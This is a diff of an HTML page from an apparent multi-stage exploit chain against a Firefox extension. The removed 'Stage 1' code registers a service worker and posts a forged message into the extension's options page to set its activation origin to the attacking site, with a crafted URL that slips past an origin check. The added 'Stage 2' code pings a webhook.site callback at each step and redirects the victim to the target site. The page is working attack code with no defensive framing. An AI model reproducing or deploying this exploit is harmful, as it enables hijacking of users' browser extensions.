@@ -1,32 +1,31 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Stage 1 - Register SW & Hijack Config</title>
-</head>
+<head><title>Stage 2</title></head>
 <body>
   <script>
     async function run() {
-      // 1. Register the Service Worker to control network fetches on this scope
-      const reg = await navigator.serviceWorker.register('/sw.js');
-      await navigator.serviceWorker.ready;
+      // Ping Webhook on Stage 2 arrival
+      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=2_arrived');
 
-      // 2. Open an iframe to the extension's web_accessible options page
+      // Wait for cs.js to inject and send message to background.js
+      await new Promise(r => setTimeout(r, 1500));
+
+      // Reset activateOn back to target origin
       const iframe = document.createElement('iframe');
       iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
       document.body.appendChild(iframe);
 
       iframe.onload = () => {
-        // 3. Post a message to set activateOn to our origin
-        // Satisfies options.js check: href contains 'https://doc.rust-lang.org/'
         iframe.contentWindow.postMessage({
-          activateOn: window.location.origin,
-          href: 'https://doc.rust-lang.org/?bypass=1'
+          activateOn: 'https://doc.rust-lang.org/',
+          href: 'https://doc.rust-lang.org/'
         }, '*');
 
-        // 4. Navigate to Stage 2 after setting config
+        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=redirecting_to_target');
+
         setTimeout(() => {
-          window.location.href = '/stage2.html?ref=https://doc.rust-lang.org/';
-        }, 500);
+          window.location.href = 'https://doc.rust-lang.org/stable/std/';
+        }, 1000);
       };
     }
     run();
